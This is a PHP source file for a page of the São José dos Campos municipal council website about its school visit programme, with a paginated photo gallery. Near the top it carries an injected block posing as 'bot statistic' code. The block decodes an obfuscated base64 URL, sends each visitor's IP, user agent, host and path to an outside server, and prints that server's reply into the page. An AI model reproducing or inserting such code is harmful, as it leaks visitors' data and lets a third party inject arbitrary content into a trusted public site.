<?php

include_once("../library/master-page.php");
include_once("../library/paginator.php");
include_once("../library/config/database/tgaleria.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Programa de Visita de Escolas");
$oMasterPage->AddParameter("css", "programa-de-visita-de-escolas/index");
$oMasterPage->AddParameter("pagina", "programa-de-visita-de-escolas");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>

    <h1>Programa Visita de Escolas</h1>
    <p>O Programa de Visita de Escolas foi criado para que os estudantes possam conhecer o funcionamento da Câmara de São José dos Campos, as funções do Poder Legislativo Municipal e o trabalho dos vereadores.</p>
    <p>Com duração de cerca de 50 minutos, a programação inclui visita às dependências da Câmara, Plenário e Memorial Legislativo; exibição de dois vídeos institucionais sobre a história de São José dos Campos e sobre a Câmara Municipal; e conversa com o presidente da Câmara.</p>
    <p class="contato">
        <strong>Para agendar visitas de escolas: </strong><br />
        3925-6573 / 3925-6567
    </p>
<?php

$oGaleria = new tgaleria();
$cbChave = each($oGaleria->ChaveLista);
$oGaleria->SQLWhere = "Chave = '" . $cbChave["key"] . "'";
$oPaginator = new Paginator($oGaleria->GetCount(), 7, "pg", null, null, null, null);
$oGaleria->SQLOrder = "Data DESC";
if($oGaleria->LoadByPaginator($oPaginator->Limit, $oPaginator->Total))
{
	?>
    <h3 class="zwo3Italic">Galeria de Fotos</h3>
	<div class="lista container-box lista-representacao col-md-12" id="paginator">

		<ul>
			<?php
			for($c = 0; $c < $oGaleria->NumRows; $c++)
			{
				?>
				<li>
					<a href="<?=$oGaleria->GenerateURL();?>">
						<strong class="zwo6"><?= utf8_encode($oGaleria->DateFormat("d \d\e MONTH \d\e Y", $oGaleria->Data));?></strong></a>
						<div class="titular"><p><?= utf8_encode($oGaleria->Titulo);?></p></div>

				</li>
				<?php
				$oGaleria->MoveNext();
			}
			?>
		</ul>
	</div>
    <div class="clear"> </div>
	<?php
	include(dirname(dirname(__FILE__)) . "/common/paginacao.php");
}

?>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>